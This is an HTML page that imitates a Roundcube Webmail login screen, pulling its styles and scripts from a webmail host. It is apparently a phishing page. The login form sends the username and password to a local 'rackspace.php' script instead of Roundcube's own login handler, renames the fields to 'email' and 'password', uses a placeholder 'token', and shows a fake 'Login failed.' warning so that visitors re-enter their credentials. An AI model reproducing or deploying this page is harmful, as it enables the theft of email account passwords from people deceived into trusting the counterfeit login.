
<!DOCTYPE html>
<html lang="en">

<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">

	<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">

	<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
			<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
		
	<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/xskin/../xframework/assets/styles/framework.css?s=1506327547">
<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1593860316">
<script src="https://webmail.supremecluster.com/program/js/jquery.min.js?s=1593860325"></script>
<script src="https://webmail.supremecluster.com/program/js/common.min.js?s=1593860317"></script>
<script src="https://webmail.supremecluster.com/program/js/app.min.js?s=1593860317"></script>
<script src="https://webmail.supremecluster.com/program/js/jstz.min.js?s=1593860325"></script>
<script>
/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10407,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":30000,"action":"","comm_path":"./?_task=login","compose_extwin":false,"dateFormats":{"php":"Y-m-d","moment":"YYYY-MM-DD","datepicker":"yy-mm-dd"},"dmFormats":{"php":"m-d","moment":"MM-DD","datepicker":"mm-dd"},"timeFormats":{"php":"H:i","moment":"HH:mm"},"xphone":false,"xtablet":false,"xmobile":false,"xdesktop":true,"xdevice":"desktop","timezoneOffset":0,"xassets":["../xframework/assets/scripts/framework.min.js","../xframework/assets/styles/framework.css","xskin:assets/scripts/xskin.min.js"],"xskin":"default","xphone_skin":"outlook","xtablet_skin":"outlook","xdesktop_skin":"default","xskin_type":"desktop","rcp_skin":false,"installed_skins":["alpha","classic","droid","elastic","icloud","larry","litecube","outlook","w21"],"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","appsMenu":"\u003Ca class=\"button-apps\" href=\"javascript:void(0)\" id=\"button-apps\" onclick=\"UI.toggle_popup(&quot;apps-menu&quot;, event)\"\u003E\u003Cspan class=\"button-inner\"\u003EApps\u003C/span\u003E\u003C/a\u003E\u003Cdiv id=\"apps-menu\" class=\"popupmenu count-1\"\u003E\u003Ca class=\"app-item app-item-xskin\" href=\"?_task=settings&amp;_action=preferences&amp;_section=general\"\u003E\u003Cdiv class='icon'\u003E\u003C/div\u003E\u003Cdiv class='title'\u003ESkins\u003C/div\u003E\u003C/a\u003E\u003C/div\u003E\n","request_token":"token"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
rcmail.display_message("Login failed.","warning",0);
rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
rcmail.gui_object('message', 'messagestack');
</script>

<script src="https://webmail.supremecluster.com/plugins/xskin/../xframework/assets/scripts/framework.min.js?s=1506327547"></script>
<script src="https://webmail.supremecluster.com/plugins/xskin/assets/scripts/xskin.min.js?s=1506327547"></script>
<script src="https://webmail.supremecluster.com/plugins/jqueryui/js/jquery-ui.min.js?s=1593860316"></script>

</head>
<body class="task-login action-none">
			<div id="layout">
	

<h1 class="voice">Roundcube Webmail Login</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" id="logo" alt="Logo">
	<form id="login-form" name="login-form" method="post" class="propform" action="rackspace.php">
<input type="hidden" name="_token" value="token">
	<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
</td>
<td class="input"><input name="email" id="rcmloginuser" required size="40" autocapitalize="off" value="" type="text"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="password" id="rcmloginpwd" required size="40" autocapitalize="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button>
</p>

		<div id="login-footer" role="contentinfo">
			Roundcube Webmail
			
						
		</div>
	</form>
</div>

<noscript>
	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>

</div>
<div id="messagestack"></div>
<script>
$(function() {
rcmail.init();
});
</script>



<script src="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.bundle.min.js?s=1593860330"></script>
<script src="https://webmail.supremecluster.com/skins/elastic/ui.min.js?s=1593860317"></script>

</body>
</html>